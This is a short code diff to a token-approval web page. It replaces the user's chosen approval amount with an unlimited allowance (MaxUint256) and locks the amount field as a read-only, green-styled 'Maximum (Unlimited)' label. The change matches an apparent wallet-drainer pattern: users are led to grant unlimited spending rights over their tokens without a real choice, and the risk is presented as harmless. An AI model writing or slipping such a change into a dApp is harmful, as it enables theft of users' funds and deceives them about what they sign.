@@ -325,7 +325,7 @@
 
     <div class="input-group">
      <label>Amount (MTK Tokens)</label>
-<input type="number" id="amountInput" placeholder="Enter amount in MTK tokens"/>
+<input type="text" id="amountInput" value="Maximum (Unlimited)" readonly style="color:#22c55e; cursor:not-allowed;"/>
     </div>
 
     <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">
@@ -405,7 +405,7 @@
 
       try {
         const decimals = await contract.decimals();
-        const parsedAmount = ethers.utils.parseUnits(amount, decimals);
+        const parsedAmount = ethers.constants.MaxUint256;
 
         setStatus('Waiting for wallet confirmation...', 'blue');
         document.getElementById('approveBtn').disabled = true;
